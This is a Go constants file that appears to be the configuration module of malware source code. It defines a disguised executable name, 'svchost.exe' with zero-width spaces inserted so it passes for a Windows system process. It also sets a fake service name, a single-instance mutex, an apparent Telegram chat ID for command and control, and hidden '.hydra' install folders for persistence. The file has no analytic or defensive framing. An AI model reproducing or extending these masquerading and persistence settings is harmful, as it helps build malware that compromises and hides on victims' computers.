package util

import "time"

const (
	ChatID      = 575794133
	GenesisText = "Genesis"
	Interval    = 5

	Ads     = "blueberry"
	Binary  = "s\u200bvch\u200bost.exe"
	Service = "Memserv2"

	Mutex = "ThisIsTotallyRandom"
)

var (
	StartTime = time.Now()
	Base      = [...]string{
		"C:\\.hydra",
		"$userprofile\\Saved Games\\.hydra",
		"$userprofile\\Documents\\.hydra",
		"$temp\\.hydra",
	}
)
